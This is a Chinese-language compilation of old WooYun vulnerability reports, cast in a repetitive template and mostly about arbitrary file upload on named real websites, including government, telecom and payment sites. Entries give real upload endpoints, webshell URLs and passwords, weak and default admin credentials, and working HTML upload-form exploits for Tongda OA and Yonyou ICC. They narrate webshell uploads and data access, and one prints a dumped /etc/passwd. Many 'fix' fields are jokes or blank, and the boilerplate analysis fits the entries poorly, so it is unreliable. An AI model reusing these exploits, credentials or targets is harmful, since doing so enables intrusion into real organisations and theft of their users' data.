**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0111834] 梆梆安全存在任意上传漏洞
**厂商**: 梆梆安全 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此处存在任意上传http://www.bangcle.com/account/base_edit/上传文件地址http://www.bangcle.com/static/license/10987.html

**POC**: 此处存在任意上传http://www.bangcle.com/account/base_edit/上传文件地址http://www.bangcle.com/static/license/10987.html

**绕过**: 直接利用

**修复**: 任意上传
---

---
### [wooyun-2015-0116314] 中国国旅上传漏洞
**厂商**: 中国国旅 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传未做任何过滤上传点：http://www.whcits.com/xieyou.aspx

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不给20，么有小JJ
---

---
### [wooyun-2015-0124749] 从一个旁站搞到多管理平台沦陷
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海人，对这个瞄了很久http://www.shyule.org/看了一下旁站，仔细寻找，终于............http://www.bio-tag.com.cn/ftb.imagegallery.aspx可以直接上传一句话没有任何防护，直接提权我没有添加用户，而是替换了shift为任务管理器后门211.152.45.195:12367shift5下调出后门进入里面有不少重要的网站，和部分数据库例举其中几个网站吧乱七八糟的都有当是我的目标是数据库打开web.config发现是智库分离ip指向116.228.40.12是上海市电信的直接打开发现试试8080端口好吧到处结束吧实在没法深入了也懒得深入了求10rank买个T恤跪谢

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 多注意细节，你懂得
---

---
### [wooyun-2014-037018] 邮政行业职业技能鉴定信息管理系统存在弱口令与任意文件上传
**厂商**: 国家邮政局 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://219.141.228.206/admin admin 直接登录

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改管理密码，设置上传限制，加强管理求礼物啊 求rank
---

---
### [wooyun-2014-050466] 中国科学软件网 存在常规漏洞 导致提权
**厂商**: 中国科学软件网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 自己想办法，，
---

---
### [wooyun-2016-0173342] 万户OA多个漏洞打包(任意文件上传.XXE.SQL注射)
**厂商**: 万户网络 | **年份**: 2016 | **类型**: 

**元思考**: 触发信号: 参数注入, 认证接口, 上传功能

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: web.xml配置得有session过滤器，只有白名单内的url放行，没有登录的话会强制跳转到登录页面。SELECT  SECU_URL FROM  EZ_SECU_PAGELIST  WHERE LIST_TYPE=1从数据库中可以得到一份白名单URL:挑几个感兴趣的来看。0x1 任意文件上传 url: /UploadServlet最后上传的文件路径就是: uploadFolder/path/fileId.substring(0, 6)/fileId，path和fileId两个参数可控，所以可以上传任意文件了官方demo演示:0x2 xfire xml实体注入webservice使用了xfire框架，存在xxe漏洞jmx-console 存在默认口令: admin/ezoffice，网上搜一下基本没改。0x3 SQL注射webservice服务需要一个通信密码，但官方自己留了一个万能密码

**POC**: http://**.**.**.**:7055/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test/123456/123456.jspx

**绕过**: 直接利用

**修复**: .
---

---
### [wooyun-2014-068626] 某门户建站系统任意文件上传影响多个政府
**厂商**: 某门户建站系统 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://www.wengyuan.gov.cn/website/deptwebsite/0180/Content.jsp?issueId=12483&msgType=00&filePath=/WEB-INF/web.xmlhttp://www.wengyuan.gov.cn//portal/admin/issue/InsertTitleImage.jsphttp://jw.meizhou.gov.cn/portal/admin/issue/InsertTitleImage.jsphttp://59.39.89.121//portal/admin/issue/InsertTitleImag

**绕过**: 直接利用

**修复**: 低版本升级版本，高版本过滤00截断
---

---
### [wooyun-2015-0119750] 某建设工程质量监督系统任意文件上传
**厂商**: 中国建筑科学研究院建研科技股份有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某建设工程质量监督系统任意文件上传。案例：http://www.jljszj.gov.cn/PKPMBS/common/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/FileUpload.aspxhttp://218.7.239.170:81/PKPMBS/common/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/FileUpload.aspxhttp://www.thszjz.com/PKPMBS/common/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/FileUpload.aspxhttp://www.ccjdw.com/PKPMBS/common/https://wooyun-img.oss-c

**POC**: 证明如下：http://www.jljszj.gov.cn/PKPMBS/common/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/FileUpload.aspx存在任意文件上传，直接上传aspx文件，上传后文件不改名，如下所示：文件路径获取：可getshell:

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2015-0138435] 深圳天悦旅游网存在fckeditor上传漏洞
**厂商**: 天悦旅游网 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.shenzhenly.cn/Fckeditor/editor/filemanager/connectors/test.htmlfckeeditor没有阉割到位 还是可以利用解析来二次上传来获得一句话

**POC**: http://www.shenzhenly.cn/Fckeditor/editor/filemanager/connectors/test.html解析的格式ali.asp;ali(2).jpg 这样的系统第一次解析是失败。连续是上传两次可以获得一句话在菜刀里面我发现这网站已经被菠菜了管理员请重视一下你的网站运营不然我们怎么放心的去旅游呢存不存在数据库不在深入点到为止 网站备份打包拿走请好好维护....

**绕过**: 直接利用

**修复**: 路径复杂化
---

---
### [wooyun-2014-086080] 山东省住房和城乡建设厅大汉系统任意文件上传
**厂商**: 山东省住房和城乡建设厅 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: UR;http://www.sdjs.gov.cn/jcms/m_5_7/replace/opr_importinfo.jsp?fn_billstatus=1仍然使用的老版本系统，此版本还存在注入。

**POC**: UR;http://www.sdjs.gov.cn/jcms/m_5_7/replace/opr_importinfo.jsp?fn_billstatus=1仍然使用的老版本系统

**绕过**: 直接利用

**修复**: 升级
---

---
### [wooyun-2015-0154043] 航天神洁某系统存在任意文件上传漏洞
**厂商**: 航天神洁（北京）环保科技有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 航天神洁（北京）环保科技有限公司是由中国航天系统科学与工程研究院、中国航天空气动力技术研究院、 航天投资控股 股份 有限公司 和中景恒基集团共同投资组建。http://**.**.**.**/index.asp漏洞地址：http://**.**.**.**/upload_flash.asp

**POC**: 通过上传jpg图片，抓包改包为asp后缀上传成功后查看页面源代码可以得到上传路径，直接就是网站根目录一句话：http://**.**.**.**/2015111315335982946.asp密码1

**绕过**: 直接利用

**修复**: 上传点过滤
---

---
### [wooyun-2013-037642] 通达OA存在任意文件上传漏洞
**厂商**: tongda2000.com | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 按说是一个老的漏洞了,今天好奇从官网上下载了一个新版的通达oa系统,安装测试了一下发现上传点依旧存在

**POC**: 产品更新时间2013年7月16日查看目录结构是否还存在漏洞文件继续使用以前的exp:<form enctype="multipart/form-data" action="http://127.0.0.1/general/vmeet/wbUpload.php?fileName=test.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>测试上传一个文件

**绕过**: 直接利用

**修复**: 我知道有可能你们会忽略这个漏洞,但是没有关系,我只希望你们能对你们的客户负责任。
---

---
### [wooyun-2012-012737] 深喉咙CMS鸡肋上传漏洞
**厂商**: 深喉咙CMS | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们修改他的网站根目录地址与上传地址。在模块处上传小马的压缩文件通过IIS6解析漏洞获得小马。

**POC**: 鸡肋点。

**绕过**: 直接利用

**修复**: 你懂的！
---

---
### [wooyun-2012-08378] (第N次)用友ICC网站客服系统任意文件上传漏洞
**厂商**: 用友软件 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞文件：/5107/include/sendmsg.class.phpfunction saveAttach() {global $errorMsg, $lang, $CONFIG, $COMMON, $basePath;if (empty($_FILES["attach"]["name"])) return '';//生成留言附件保存目录.$path = 'data/leavewordfile/'.date("Ymd").'/';if (!is_dir($CONFIG->basePath.$path))	{$COMMON->createDir($CONFIG->basePath.$path);}//文件名.$fileName = date('YmdHis').rand(100000, 999999).strrchr($_FILES['attach']['name'], '.');$sy

**POC**: 随便找了个站测试如下↓

**绕过**: 直接利用

**修复**: 过滤拉。希望不要再让我找到你们的这类漏洞哦。。
---

---
### [wooyun-2012-06749] 再暴用友ICC网站客服系统任意文件上传漏洞
**厂商**: 用友软件 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 再暴用友ICC网站客服系统任意文件上传漏洞，看了一下上一个漏洞：WooYun: 用友ICC网站客服系统远程代码执行漏洞，发现还存在其它的上传漏洞。不知是不是还没升级完成或是什么问题，但测试多个网站均存在漏洞。/home/ecccs/web/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/screenImagesSave.php(相关上传的也同样有)<?php/*** screenImagesSave.php**/require_once('../global.inc.php');//get request.$ft = intval($_REQUEST['ft']);/*chdir($CONFIG["canned_file_tmp"]);exec("rm -rf *");*/$date = date("Ymd");$dest

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 应该懂得！
---

---
### [wooyun-2012-05842] 中国电信上传漏洞
**厂商**: 中国电信 | **年份**: 2012 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传漏洞  而已http://ict.chinatelecom.com.cn/ict/pages/Browser.jsp?sort=1&file=%2Fopt%2Ftomcat%2Fwebapps%2Fict%2Fict%2Fpages%2Fmadman.jsp

**POC**: http://ict.chinatelecom.com.cn/ict/pages/Browser.jsp

**绕过**: 直接利用

**修复**: 你懂的如何修复
---

---
### [wooyun-2014-081059] 华南理工大学广州学院校园电视台（一枚上传漏洞）
**厂商**: 华南理工大学 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://tv.gcu.edu.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/day_141028/201410281221219991.html

**POC**: 可直接上传html 丨1.asp；jpg丨txt等

**绕过**: 直接利用

**修复**: 我也不知道怎么修复，本人菜鸟啊，我是来混邀请码的
---

---
### [wooyun-2015-0121524] 住哲客房管家PMS系统任意文件上传(20个核心数据库可控)
**厂商**: zhuzher.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://pms.zhuzher.com 客房管家PMS登录后员工信息管理照片任意文件上传POST /uploadEmployeePhoto.html HTTP/1.1Host: pms.zhuzher.comProxy-Connection: keep-aliveContent-Length: 87688Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://pms.zhuzher.com数据库为分布式，先找数据库配置主库连上后查找数据库帐号密码连接表随便选择一个库连接，会员数统计会员信息

**POC**: 订单表

**绕过**: 直接利用

**修复**: 上传类型限制
---

---
### [wooyun-2012-06870] 支付宝某频道任意文件上传漏洞
**厂商**: 支付宝 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 频道：http://job.alipay.com/支付宝招聘在修改简历时附件上传那里，由于没有判断上传类型，造成文件上传漏洞。抓包改包。POST /index.php?r=attachment/upload HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5User-Agent: Shockwave FlashHost: job.alipay.comContent-Length: 776Connection: Keep-AliveCache-Control: no-cacheCookie: 这里自己加上------------Ef1ei4ei4GI3Ef1gL6Ij5gL6Ef1Ij5Content-Disposition: fo

**POC**: http://job.alipay.com/resume/resumeattach/other/201205/20120509_050149_13.php

**绕过**: 直接利用

**修复**: 应该懂
---

---
### [wooyun-2015-0123739] 无线苏州APP 私信遍历/短信轰炸/任意文件上传
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://wooyun.org/bugs/wooyun-2015-0111690 看到这个洞最后报给中移动所以厂商填了中国移动。1.大多数用户操作都有登录校验，除了查看私信。这里遍历ID达到查看他人私信目的。2.绑定手机处的验证码获取接口缺少校验导致短信轰炸。3.头像上传处php被封了，html依旧潇洒，菠菜网站最喜欢。

**POC**: 同上。

**绕过**: 直接利用

**修复**: 你们更专业。
---

---
### [wooyun-2013-034654] 光大证劵旗下某期货业务可以被远程入侵
**厂商**: 光大证劵 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.ebfcn.com/任意上传。注册一个账号。然后来到这里http://www.ebfcn.com/Job/JobInfo.aspx上传没有任何过滤，直接上传看下权限多大。同ip网站再来看数据库配置这么简单的数据库名字，超级容易被猜到。由于证劵。点到为止。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 拒绝跨省
---

---
### [wooyun-2013-020232] 大地数字影院上传不当，22w会员数据泄露
**厂商**: 大地数字影院 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先来到注册会员处：http://www.dadicinema.com/member/reg/chnreg.shtml，有个头像上传，果断先传个试试，burp suite再抓个包：，发现网站是asp.net写的，我就把内容改成了aspx一句话，然后把jpg直接改成aspx试试，上传成功：，。然后翻了下会员数据，目测感觉竟然有22W之多，。好歹也是影院的主站，上传的地方一点限制都没有，哎~~

**POC**: 。求票啊求票。。。

**绕过**: 直接利用

**修复**: 很多办法。
---

---
### [wooyun-2013-017113] ThinkSNS某处任意上传文件漏洞，获取官方站点控制权
**厂商**: ThinkSNS | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ThinkSNS群组上传文档处存在任意上传文件漏洞，可导致四个网站沦陷、用户数据泄露，你说是不是高危？1.我们打开一个群组上传文档2.开始抓包，上传一个图片网马比如yy.jpg，然后在包里面改为yy.php3.于是上传成功看看文件，额~~~~4.连一连5.跨一跨6.看一看数据

**POC**: o(︶︿︶)o 唉~~SNS的用户数据就这么不安全么……?

**绕过**: 直接利用

**修复**: 这个你必须懂啊！
---

---
### [wooyun-2015-0105997] 上海交通学校某实验室FTP未授权访问导致数据泄露
**厂商**: www.cert.org.cn | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ftp://202.120.53.237/

**POC**: 另外的FTP账号密码：上海交通大学：关于GED耐久的解释：http://www.docin.com/p-279278792.html应该是最新发动机的实验室。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0171280] 河北省某厅主站任意文件上传
**厂商**: 河北省交通运输厅 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-027095] 263主站任意文件上传加注射导致网站沦陷
**厂商**: 263通信 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: null

**POC**: null

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2013-025240] 搜狐两个分站存在目录遍历漏洞+管理员信息泄漏和上传
**厂商**: 搜狐 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞在这个搜狐新闻客户端这两个下载站3g.k.sohu.com/api/mp.wap.sohu.com/api/除了网址网站里面内容都是一样的都存在目录遍历漏洞和文件上传功能还有一些管理员敏感信息泄漏

**POC**: 看吧网站目录一览无云这位大叔好帅啊由于时间关系没自习研究拿shell，不过相信难不倒我

**绕过**: 直接利用

**修复**: 我家妹纸很喜欢你们搜狐那个公仔，可以送一个吗？很期待。
---

---
### [wooyun-2014-059184] 赛迪网某站弱口令+任意文件上传
**厂商**: 赛迪网 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 弱口令http://project.ccidnet.com/cases/index.shtml登录点无验证码，直接爆破获得一组用户名密码test/Test1234562. 任意文件上传这里可以上传任意文件

**POC**: 传了个jspspy上去，望删除struts2架构，直接root权限了root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync mail:x:8:12:mail:/var/spool/mail:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin 

**绕过**: 直接利用

**修复**: 1. 限制弱口令2. 限制文件后缀
---

---
### [wooyun-2013-042070] PHPYUN V3.0任意文件上传漏洞
**厂商**: php云人才系统 | **年份**: 2013 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞出现在/member/model/index.class.php178行save_avatar_action函数该函数调用方式由/member/index.php来解析url127.0.0.1/member/index.php?M=index&C=save_avatar_action如图$new_avatar_path这个变量是由$pic_id和$type组成，而picid和tyoe又完全可控所以在file_put_contents的时候，我们就能任意操作文件写入。写入的内容为post提交的数据

**POC**: 首先要登陆发送这样一个请求上传成功

**绕过**: 直接利用

**修复**: 对两个变量进行处理
---

---
### [wooyun-2015-0116407] 中国电信某重要系统漏洞打包
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国电信微号地址：http://124.126.119.144/该系统运行允许使用电信短信密码以及中国电信通行证进行登录，可见其厉害之处这里我要用我大移动手机进行注册，但是系统提示仅允许电信号注册，切看我如何绕过限制没错，就是这里，忘记密码处没有对移动手机号码进行判断，导致大移动成功收到验证短信，且短信可用于用户注册。此处存在短信任意发送漏洞，可指定任意手机号进行短信轰炸

**POC**: 通过获取到的注册码进行用户注册在注册的时候可以选择个人或者企业，我选择了企业就这样我用138段的移动号码成功注册了一个所谓的微号居然还有免费的短信限额在素材菜单里，存在越权操作他人素材的漏洞在素材预览时，抓包，可以获取到素材id，该id按一定规则递增，可通过遍历得到他人素材路径比如POSThttp://124.126.119.144/pnumber/picMgrJson/picMgr_getPicInfo.do HTTP/1.1Host: 124.126.119.144Connection: keep-aliveContent-Length: 15Accept: */*Origin: http

**绕过**: 过滤绕过

**修复**: 过滤
---

---
### [wooyun-2012-07960] 再再暴用友ICC网站客服系统任意文件上传漏洞
**厂商**: 用友软件 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试多个网站均存在漏洞。/home/ecccs/web/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/screenImagesSave.php具体自己看源码这里直接给出利用代码。<form enctype="multipart/form-data" method="post"action="http://icc.5107.cn/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/screenImagesSave.php?filename=jpg.php."><input type="file" name="file"><input type="submit" name="up" value="上传"></form>上一个是jpg.php 这个是只要在jpg.

**POC**: http://icc.5107.cn/data/guige.txt

**绕过**: 直接利用

**修复**: 你们懂得！
---

---
### [wooyun-2013-026869] 山东省政府采购管理系统列目录泄露采购计划信息
**厂商**: 山东省财政信息中心 | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接输入url：http://123.233.119.251:8083/sdgphttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/可看到该目录下所有文件，从路径名判断应该是个上传附件的目录，而且从文件名判断很多文件上传日期很新，应该是还在使用中的系统。另外该目录里部分文档内容被google收录：ip反查可知该地址隶属于山东省财政信息中心：

**POC**: 可以看到所有该目录下面文件的内容，包括一些合同附件等

**绕过**: 直接利用

**修复**: 建议配置好robot.txt另外关闭目录遍历
---

---
### [wooyun-2010-0923] 搜狐分站后台绕过漏洞
**厂商**: 搜狐 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://product.news.sohu.com/admin/

**POC**: http://product.news.sohu.com/admin/nor_upload_inc.php 本地限制脚本执行  可直接上传

**绕过**: 直接利用

**修复**: 更改验证机制
---

---
### [wooyun-2015-0107532] 看我是如何控制数万台路由器WiFi及广告的
**厂商**: 深圳市百米生活电子商务有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百米生活，通过免费商业Wi-Fi的铺设，在全国各城市打造一个基于本地化社区的电子商务服务平台，为商家提供产品推广、品牌宣传、商家管理及成本控制等服务；为消费者带来社区附近衣食住行、吃喝玩乐的信息服务，同时借助免费Wi-Fi技术支持，开启移动互联网的全新生活方式。据资料显示  该公司的百米生活路由器已经遍布全国多个省市了，用户多达数十万！不可否认这是全国最NB的一个（广告路由器） 说实话他这个路由器穿透力确实够NB赞一个   就是广告太多了一切起因皆因贵公司的广告    特么的深深的打动了我  才有了今天的故事废话就不多说了  直接上漏洞证明

**POC**: 官网www.100msh.com漏洞出现在http://open.100msh.com  开发者平台存在任意文件上传首先我们先注册用户http://open.100msh.com/user/register_dev.html此处填写信息写完之后来到我们的个人资料-上传我们的php一句话点击提交  会提交请上传jpg文件  这个不管他  返回页面的时候我们的一句话已经上传了http://img.100msh.net//developer/credential_file/12e31512040936467884.php我们的php一句话已经执行让人激动不已  里面有主站以及多个分站  开发站点等 

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-035526] 改图网全站沦陷(160万用户数据奄奄一息)
**厂商**: gaitu.com | **年份**: 2013 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看似不注意的地方就会成为入侵的绝对关键这次的入侵时因为一个上传漏洞导致的在漏洞扫描过程中发现fck上传的地方，哈哈http://yinshua.gaitu.com/FCKeditor/editor/filemanager/browser/default/connectors/test.html之后经过探究，没办法解析aspx大马，只能上小马咯之后就一发不可收拾了。这是木马的地址之后我下载了Web.config 来查看看，泄露了很多东西哦！！ftp的地址我google了一下，是img分站的，只能写之后查看了数据库连接账号和密码，能够连接成功哦！！160万用户信息可危险了呢，最后我添加一个文件到主站，看看值得一提的是，这个站的ip就是主站的ip而且，其他基本全部站都在这个服务器上看这是比较重要的几个站地址再拿一个站测试下所以说是全站沦陷啦！！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 低级漏洞，赶紧修复
---

---
### [wooyun-2012-06904] 国家发改委重大科技项目成果系统存在任意文件上传漏洞
**厂商**: 国家发改委 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 自己看着办吧
---

---
### [wooyun-2013-024622] 速途网任意文件上传漏洞
**厂商**: 速途网络科技有限公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在速途网主页底部点在线投稿，会弹出一个文章投稿的页面。存在一个kindeditor编辑器，可以上传任意类型文件。

**POC**: (见原文)

**绕过**: 直接利用

